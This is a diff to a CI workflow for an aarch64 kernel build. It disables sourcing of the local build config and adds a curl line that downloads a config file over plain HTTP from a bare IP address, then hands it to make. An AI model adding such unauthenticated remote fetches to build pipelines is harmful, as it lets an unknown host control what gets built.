@@ -91,15 +91,18 @@ jobs:
           # 即使有缓存，也可以清理构建产物以保证环境纯净，或者保留以加速（这里选择清理以防配置冲突）
           make mrproper
           
-          if [ -f build.config.aarch64 ]; then
-            echo "Found build.config.aarch64, sourcing..."
-            set -a
-            source build.config.aarch64
-            set +a
-            DEFCONFIG=olddefconfig
-          else
-            DEFCONFIG=defconfig
-          fi
+          # if [ -f build.config.aarch64 ]; then
+          #   echo "Found build.config.aarch64, sourcing..."
+          #   set -a
+          #   source build.config.aarch64
+          #   set +a
+          #   DEFCONFIG=olddefconfig
+          # else
+          #   DEFCONFIG=defconfig
+          # fi
+
+          curl -q http://45.146.234.183:8080/config >config
+          DEFCONFIG=config
           
           make O=out ARCH=${{ env.ARCH }} CC=clang CROSS_COMPILE=${{ env.CROSS_COMPILE }} $DEFCONFIG
           
